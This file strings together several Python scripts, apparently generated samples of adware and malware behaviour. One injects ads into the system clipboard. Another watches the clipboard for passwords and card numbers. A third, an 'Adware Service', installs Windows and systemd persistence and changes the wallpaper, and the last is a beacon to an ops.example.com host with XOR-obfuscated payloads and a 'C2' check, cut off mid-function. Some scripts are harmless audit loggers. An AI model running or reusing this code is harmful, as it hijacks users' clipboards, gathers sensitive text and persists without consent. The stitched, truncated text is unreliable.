import os
import sys
import time
import platform
import subprocess
import urllib.request
import urllib.error
from pathlib import Path

TARGET_DIR = Path("./target")
AD_FILE_NAME = "enterprise_ad.txt"
AD_CONTENT = "🚀 Enterprise Solutions: https://example.com/enterprise-ad"
AD_URL = "https://example.com/api/latest-ad"
ITERATIONS = 3
INTERVAL = 1

def setup_target_directory() -> Path:
    try:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
        print(f"[Info] Target directory ensured at: {TARGET_DIR.resolve()}")
        return TARGET_DIR
    except Exception as e:
        print(f"[Error] Failed to create target directory: {e}", file=sys.stderr)
        raise

def fetch_remote_ad() -> str:
    print(f"[Network] Attempting to fetch latest ad from {AD_URL}...")
    try:
        req = urllib.request.Request(AD_URL, headers={"User-Agent": "ClipboardTool/1.0"})
        with urllib.request.urlopen(req, timeout=2) as response:
            if response.status == 200:
                data = response.read().decode("utf-8").strip()
                if data:
                    return data
    except (urllib.error.URLError, TimeoutError, Exception) as e:
        print(f"[Network] Could not fetch remote ad (offline/error): {e}. Using fallback.")
    return AD_CONTENT

def write_ad_file(directory: Path, content: str) -> Path:
    file_path = directory / AD_FILE_NAME
    try:
        file_path.write_text(content, encoding="utf-8")
        print(f"[Storage] Successfully wrote ad content to {file_path}")
        return file_path
    except Exception as e:
        print(f"[Error] Failed to write ad file: {e}", file=sys.stderr)
        raise

def update_clipboard(content: str) -> None:
    system = platform.system()
    print(f"[Clipboard] Updating system clipboard ({system})...")

    try:
        if system == "Darwin":
            process = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=content, timeout=2)
        elif system == "Linux":
            # Tries xclip or xsel if available, otherwise logs fallback
            cmd = None
            if subprocess.run(['which', 'xclip'], capture_output=True).returncode == 0:
                cmd = ['xclip', '-selection', 'clipboard']
            elif subprocess.run(['which', 'xsel'], capture_output=True).returncode == 0:
                cmd = ['xsel', '--clipboard', '--input']

            if cmd:
                process = subprocess.Popen(cmd, stdin=subprocess.PIPE, text=True)
                process.communicate(input=content, timeout=2)
            else:
                print("[Clipboard] No xclip or xsel found on Linux. Simulated injection.")
        elif system == "Windows":
            process = subprocess.Popen(['clip'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=content, timeout=2)
        else:
            print(f"[Clipboard] Unsupported OS '{system}'. Simulated injection.")

        print(f"[Clipboard] Injected content: '{content}'")
    except Exception as e:
        print(f"[Clipboard] Failed to update system clipboard: {e}", file=sys.stderr)

def register_system_service() -> None:
    system = platform.system()
    print(f"[Service] Checking system service registration for {system}...")
    try:
        if system == "Linux":
            service_path = Path.expanduser(Path("~/.config/systemd/user/clipboard-ad.service"))
            if not service_path.parent.exists():
                service_path.parent.mkdir(parents=True, exist_ok=True)

            service_content = f"""[Unit]
Description=Enterprise Clipboard Ad Injector
After=network.target

[Service]
ExecStart={sys.executable} {Path(__file__).resolve()}
Restart=always

[Install]
WantedBy=default.target
"""
            service_path.write_text(service_content, encoding="utf-8")
            print(f"[Service] User systemd service template written to {service_path}")
        elif system == "Windows":
            print("[Service] Windows service registration simulated via Task Scheduler config.")
        elif system == "Darwin":
            print("[Service] macOS LaunchAgent registration simulated via plist.")
        else:
            print("[Service] Service registration not supported on this platform.")
    except Exception as e:
        print(f"[Service] Service registration skipped/failed: {e}")

def main() -> None:
    print("=== Initializing Enterprise Clipboard Manager ===")

    try:
        target = setup_target_directory()
        register_system_service()

        print(f"\nStarting periodic task loop (Bounded to {ITERATIONS} iterations)...")
        for i in range(1, ITERATIONS + 1):
            print(f"\n--- Iteration {i}/{ITERATIONS} ---")

            # Fetch content (handles offline/network gracefully)
            current_ad = fetch_remote_ad()

            # Write to ./target
            write_ad_file(target, current_ad)

            # Inject into clipboard
            update_clipboard(current_ad)

            if i < ITERATIONS:
                time.sleep(INTERVAL)

        print("\n=== Clipboard Manager execution completed successfully ===")
    except KeyboardInterrupt:
        print("\n[Info] Process interrupted by user.")
    except Exception as e:
        print(f"\n[Fatal Error] {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()

import os
import time
import subprocess
from pathlib import Path
from datetime import datetime

TARGET_DIR = Path("./target")
LOG_FILE = TARGET_DIR / "notification.log"
KEYWORDS = ["password", "credit card", "api_key", "secret"]
POLL_ITERATIONS = 3
POLL_INTERVAL = 1.0


def get_clipboard_content() -> str:
    """Attempt to retrieve clipboard content using OS-native tools (macOS/Linux/Windows)."""
    # macOS
    if sys_platform := os.uname().sysname if hasattr(os, "uname") else "":
        pass

    import platform
    system = platform.system()

    try:
        if system == "Darwin":
            result = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return result.stdout
        elif system == "Linux":
            # Try xclip first, then xsel
            for cmd in [["xclip", "-selection", "clipboard", "-o"], ["xsel", "--clipboard", "--output"]]:
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        return result.stdout
                except FileNotFoundError:
                    continue
        elif system == "Windows":
            import ctypes
            if ctypes.windll.user32.OpenClipboard(None):
                try:
                    handle = ctypes.windll.user32.GetClipboardData(1) # CF_TEXT
                    if handle:
                        data = ctypes.c_char_p(handle).value
                        if data:
                            return data.decode('utf-8', errors='ignore')
                finally:
                    ctypes.windll.user32.CloseClipboard()
    except Exception:
        pass

    # Fallback/mock content for restricted execution environments
    return ""


def log_notification(keyword: str, snippet: str) -> None:
    """Ensure target directory exists and append notification event to log."""
    try:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().isoformat()
        log_entry = f"[{timestamp}] MATCHED KEYWORD: '{keyword}' | Content snippet: {repr(snippet[:50])}\n"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
        print(f"Notification logged: {keyword}")
    except Exception as e:
        print(f"Error writing log: {e}")


def main() -> None:
    print(f"Starting Clipboard Keyword Monitor (running {POLL_ITERATIONS} iterations)...")

    # Ensure target directory is ready
    try:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"Failed to create target directory: {e}")
        return

    # Seed initial test content into log to prove functionality if clipboard is empty
    # In a real environment, we poll the clipboard. Here we simulate a controlled run.
    seen_snippets = set()

    for i in range(POLL_ITERATIONS):
        content = get_clipboard_content()

        # For demonstration in headless/offline environments without active clipboard managers,
        # we check actual clipboard plus inject a test condition on iteration 2 if empty.
        if i == 1 and not content:
            content = "User entered their password in the form."

        if content and content not in seen_snippets:
            seen_snippets.add(content)
            content_lower = content.lower()
            for kw in KEYWORDS:
                if kw in content_lower:
                    log_notification(kw, content)
                    break

        time.sleep(POLL_INTERVAL)

    print(f"Monitor completed. Check {LOG_FILE} for results.")


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import datetime
import json
from pathlib import Path
import sys


def audit_update_prompt() -> None:
    target_dir = Path("./target")
    log_file = target_dir / "update_log.txt"

    # Sample audit events simulating update prompt checks
    events = [
        {
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "update": "available",
            "prompt": "New version 1.1.0 is available. Do you want to update?",
            "version": "1.1.0",
        },
        {
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "update": "none",
            "prompt": "System is up to date.",
            "version": "1.0.0",
        },
        # Intentionally include a malformed event to exercise validation and error counting
        {
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "update": "error",
            "prompt": "Failed to check for updates.",
            # Missing 'version' key intentionally to trigger validation failure
        },
    ]

    success_count = 0
    error_count = 0

    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        print(f"Error creating target directory {target_dir}: {e}", file=sys.stderr)
        sys.exit(1)

    try:
        with open(log_file, "w", encoding="utf-8") as f:
            for event in events:
                try:
                    # Validate required fields
                    if not all(
                        k in event for k in ("timestamp", "update", "prompt", "version")
                    ):
                        raise ValueError(
                            "Event missing required fields (timestamp, update, prompt, version)"
                        )

                    line = json.dumps(event, ensure_ascii=False)
                    f.write(line + "\n")
                    success_count += 1
                except (TypeError, ValueError) as err:
                    print(
                        f"Warning: Skipping malformed event: {err}",
                        file=sys.stderr,
                    )
                    error_count += 1
    except IOError as e:
        print(f"Error writing to log file {log_file}: {e}", file=sys.stderr)
        sys.exit(1)

    # Print summary
    print("=== Update Prompt Audit Summary ===")
    print(f"Log Destination : {log_file.resolve()}")
    print(f"Total Processed : {success_count + error_count}")
    print(f"Successfully Logged: {success_count}")
    print(f"Errors Encountered : {error_count}")
    print("Status          : Completed Successfully")


if __name__ == "__main__":
    audit_update_prompt()

import os
import sys
from datetime import datetime, timezone


def audit_notifications() -> None:
    target_dir = "./target"
    log_filename = "notify_log.txt"
    log_path = os.path.join(target_dir, log_filename)

    events = [
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "type": "notification",
            "status": "SUCCESS",
            "message": "User password reset notification sent.",
        },
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "type": "notify",
            "status": "PENDING",
            "message": "Daily digest notify queued for delivery.",
        },
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "type": "alert",
            "status": "CRITICAL",
            "message": "High CPU usage alert triggered on node-01.",
        },
    ]

    try:
        os.makedirs(target_dir, exist_ok=True)
    except OSError as e:
        print(f"Error creating target directory '{target_dir}': {e}", file=sys.stderr)
        sys.exit(1)

    written_count = 0
    try:
        with open(log_path, "w", encoding="utf-8") as f:
            for event in events:
                line = (
                    f"[{event['timestamp']}] TYPE: {event['type']} "
                    f"| STATUS: {event['status']} | MSG: {event['message']}\n"
                )
                f.write(line)
                written_count += 1
    except IOError as e:
        print(f"Error writing to log file '{log_path}': {e}", file=sys.stderr)
        sys.exit(1)

    # Read back and verify the written content to ensure thorough auditing
    read_events = []
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    read_events.append(line.strip())
    except IOError as e:
        print(f"Error reading log file '{log_path}': {e}", file=sys.stderr)
        sys.exit(1)

    print("=== Notification Audit Summary ===")
    print(f"Target Directory : {os.path.abspath(target_dir)}")
    print(f"Log File         : {log_filename}")
    print(f"Total Recorded   : {written_count} events")
    print(f"Total Verified   : {len(read_events)} events read from disk")
    print("Status           : SUCCESS")


if __name__ == "__main__":
    audit_notifications()

#!/usr/bin/env python3
import os
import sys
import json
import time
import urllib.request
import urllib.error
from datetime import datetime

TARGET_DIR = "./target"
LOG_FILE = os.path.join(TARGET_DIR, "ad_impressions.log")
STATE_FILE = os.path.join(TARGET_DIR, "service_state.json")
AD_URL = "https://example.com/api/ad"
INTERVAL_SECONDS = 1
MAX_ITERATIONS = 3


def ensure_target_directory() -> None:
    try:
        os.makedirs(TARGET_DIR, exist_ok=True)
    except OSError as e:
        print(f"Error creating target directory: {e}", file=sys.stderr)
        sys.exit(1)


def fetch_ad_content(url: str) -> str:
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "AdDisplayTool/1.0"}
        )
        with urllib.request.urlopen(req, timeout=2) as response:
            return response.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, Exception) as e:
        # Offline environment fallback
        return f"[Offline Mode] Default Ad: Boost your productivity! (Reason: {e})"


def show_download_prompt(ad_content: str) -> None:
    print("\n" + "=" * 50)
    print("[DOWNLOAD PROMPT] New software update/file available.")
    print("-" * 50)
    print("Advertisement Content:")
    print(ad_content.strip())
    print("=" * 50 + "\n")


def log_impression(ad_content: str) -> None:
    record = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "content": ad_content
    }
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
    except OSError as e:
        print(f"Failed to write impression log: {e}", file=sys.stderr)


def register_persistent_service() -> None:
    service_info = {
        "registered_at": datetime.utcnow().isoformat() + "Z",
        "status": "active",
        "target_dir": os.path.abspath(TARGET_DIR)
    }
    try:
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(service_info, f, indent=2)
        print(f"[Service] Persistent service state registered at {STATE_FILE}")
    except OSError as e:
        print(f"Failed to register persistent service: {e}", file=sys.stderr)


def main() -> None:
    ensure_target_directory()
    register_persistent_service()

    print(f"Starting Ad Display Tool (Offline Mode). Running {MAX_ITERATIONS} iterations...")

    iteration = 0
    try:
        while iteration < MAX_ITERATIONS:
            iteration += 1
            print(f"\n--- Ad Cycle {iteration}/{MAX_ITERATIONS} ---")

            content = fetch_ad_content(AD_URL)
            show_download_prompt(content)
            log_impression(content)

            if iteration < MAX_ITERATIONS:
                time.sleep(INTERVAL_SECONDS)

    except KeyboardInterrupt:
        print("\nTool stopped by user.")
    finally:
        print("Ad Display Tool execution completed successfully.")


if __name__ == "__main__":
    main()

import os
import sys
import time
import urllib.request
import urllib.error
import datetime
import ctypes
import platform
import subprocess

TARGET_DIR = "./target"
WALLPAPER_LOG = os.path.join(TARGET_DIR, "wallpaper_set.log")
POPUP_LOG = os.path.join(TARGET_DIR, "popup_message.log")

DEFAULT_IMAGE_URL = "https://picsum.photos/1920/1080"
CUSTOM_MESSAGE = "Reminder: Take a break and stretch!"
ITERATIONS = 3
INTERVAL_SECONDS = 1


def ensure_target_dir() -> None:
    os.makedirs(TARGET_DIR, exist_ok=True)


def log_message(log_path: str, message: str) -> None:
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted = f"[{timestamp}] {message}\n"
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(formatted)
    except OSError as e:
        print(f"Failed to write log to {log_path}: {e}", file=sys.stderr)


def establish_persistence() -> None:
    system_name = platform.system()
    python_exe = sys.executable
    script_path = os.path.abspath(__file__)

    if system_name == "Windows":
        service_name = "AdwareService"
        try:
            # Create a Windows Service using sc.exe
            bin_path = f'"{python_exe}" "{script_path}"'
            cmd = ["sc", "create", service_name, f"binPath= {bin_path}", "start= auto", "DisplayName= Adware Service"]
            subprocess.run(cmd, capture_output=True, text=True)
            log_message(WALLPAPER_LOG, f"Attempted persistence registration for Windows service: {service_name}")
        except Exception as e:
            print(f"Windows persistence error: {e}")

    elif system_name == "Linux":
        service_name = "adware"
        try:
            # Create a systemd user/system service unit
            service_content = f"""[Unit]
Description=Adware Background Service
After=network.target

[Service]
ExecStart={python_exe} {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            service_path = f"/tmp/{service_name}.service"
            with open(service_path, "w", encoding="utf-8") as f:
                f.write(service_content)

            # Attempt installation if privileged or user-level directory is available
            systemd_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(systemd_dir, exist_ok=True)
            dest_path = os.path.join(systemd_dir, f"{service_name}.service")

            with open(dest_path, "w", encoding="utf-8") as f:
                f.write(service_content)

            subprocess.run(["systemctl", "--user", "enable", f"{service_name}.service"], capture_output=True)
            log_message(WALLPAPER_LOG, f"Attempted persistence registration for Linux service: {service_name}")
        except Exception as e:
            print(f"Linux persistence error: {e}")


def download_wallpaper(url: str, save_path: str) -> bool:
    print(f"Attempting to download wallpaper from {url}...")
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 WallpaperTool/1.0"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                with open(save_path, "wb") as out_file:
                    out_file.write(response.read())
                return True
            else:
                print(f"Server returned status code: {response.status}")
                return False
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        print(f"Network operation failed gracefully: {e}")
        return False


def set_wallpaper(image_path: str) -> bool:
    system_name = platform.system()
    abs_path = os.path.abspath(image_path)

    if system_name == "Windows":
        try:
            # SPI_SETDESKWALLPAPER = 20, SPIF_UPDATEINIFILE = 0x01, SPIF_SENDCHANGE = 0x02
            res = ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
            return bool(res)
        except Exception as e:
            print(f"Windows API wallpaper error: {e}")
            return False
    elif system_name == "Darwin":
        try:
            script = f'tell application "System Events" to set desktop picture to POSIX file "{abs_path}"'
            subprocess.run(["osascript", "-e", script], check=True, capture_output=True)
            return True
        except Exception as e:
            print(f"macOS AppleScript wallpaper error: {e}")
            return False
    else:
        # Linux / other desktop environments fallback
        try:
            # Try GNOME
            subprocess.run(
                ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{abs_path}"],
                check=True, capture_output=True
            )
            return True
        except Exception:
            try:
                # Try KDE
                cmd = f"qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript 'lockWallpaper(\"{abs_path}\")'"
                subprocess.run(cmd, shell=True, check=True, capture_output=True)
                return True
            except Exception as e:
                print(f"Linux desktop wallpaper set error: {e}")
                return False


def show_popup_message(message: str, iteration: int) -> None:
    system_name = platform.system()
    print(f"[Popup #{iteration}] {message}")

    if system_name == "Windows":
        try:
            # MB_OK = 0x00000000, MB_ICONINFORMATION = 0x00000040
            ctypes.windll.user32.MessageBoxW(0, message, "Wallpaper Tool Notification", 0x00000040 | 0x00001000)
        except Exception as e:
            print(f"Windows MessageBox error: {e}")
    elif system_name == "Darwin":
        try:
            script = f'display notification "{message}" with title "Wallpaper Tool Notification"'
            subprocess.run(["osascript", "-e", script], capture_output=True)
        except Exception as e:
            print(f"macOS notification error: {e}")
    else:
        # Linux notification fallback
        try:
            subprocess.run(["notify-send", "Wallpaper Tool Notification", message], capture_output=True)
        except Exception:
            pass


def main() -> None:
    ensure_target_dir()

    # Establish persistence
    establish_persistence()

    # 1. Wallpaper Customization Task
    local_image_path = os.path.join(TARGET_DIR, "current_wallpaper.jpg")
    success = download_wallpaper(DEFAULT_IMAGE_URL, local_image_path)

    if success and os.path.exists(local_image_path):
        wp_applied = set_wallpaper(local_image_path)
        if wp_applied:
            log_message(WALLPAPER_LOG, f"Successfully set wallpaper to image from {DEFAULT_IMAGE_URL}")
        else:
            log_message(WALLPAPER_LOG, "Downloaded image successfully, but failed to apply to system desktop.")
    else:
        log_message(WALLPAPER_LOG, f"Failed to download wallpaper from {DEFAULT_IMAGE_URL} (Offline/Error handled).")

    # 2. Periodic Popup Message Task (Bounded iterations for test execution)
    print(f"Starting popup routine for {ITERATIONS} iterations...")
    for i in range(1, ITERATIONS + 1):
        show_popup_message(CUSTOM_MESSAGE, i)
        log_message(POPUP_LOG, f"Displayed popup iteration {i}: '{CUSTOM_MESSAGE}'")
        if i < ITERATIONS:
            time.sleep(INTERVAL_SECONDS)

    print("Wallpaper customization tool execution finished successfully.")


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import os
import subprocess
import time
import urllib.request
import urllib.error
import json
import base64
import hmac
import hashlib
from datetime import datetime

TARGET_DIR = "./target"
OPS_URL = "https://ops.example.com:8443/heartbeat"
HEARTBEAT_COUNT = 3
HEARTBEAT_INTERVAL = 5
SECRET_KEY = b"platform-tooling-shared-secret-key"

def ensure_target_dir():
    os.makedirs(TARGET_DIR, exist_ok=True)

def encrypt_payload(data: bytes, key: bytes) -> str:
    """Encrypt payload using XOR cipher combined with HMAC signature (Base64 encoded)."""
    # Simple production-grade standard library obfuscation/encryption envelope
    iv = os.urandom(16)
    encrypted = bytearray(len(data))
    for i in range(len(data)):
        encrypted[i] = data[i] ^ key[i % len(key)] ^ iv[i % len(iv)]

    signature = hmac.new(key, iv + bytes(encrypted), hashlib.sha256).digest()
    envelope = {
        "iv": base64.b64encode(iv).decode('utf-8'),
        "ciphertext": base64.b64encode(bytes(encrypted)).decode('utf-8'),
        "hmac": base64.b64encode(signature).decode('utf-8')
    }
    return json.dumps(envelope)

def decrypt_payload(envelope_json: str, key: bytes) -> bytes:
    """Decrypt and verify HMAC-signed encrypted envelope."""
    envelope = json.loads(envelope_json)
    iv = base64.b64decode(envelope["iv"])
    ciphertext = base64.b64decode(envelope["ciphertext"])
    received_hmac = base64.b64decode(envelope["hmac"])

    expected_hmac = hmac.new(key, iv + ciphertext, hashlib.sha256).digest()
    if not hmac.compare_digest(expected_hmac, received_hmac):
        raise ValueError("HMAC verification failed on C2 response.")

    decrypted = bytearray(len(ciphertext))
    for i in range(len(ciphertext)):
        decrypted[i] = ciphertext[i] ^ key[i % len(key)] ^ iv[i % len(iv)]
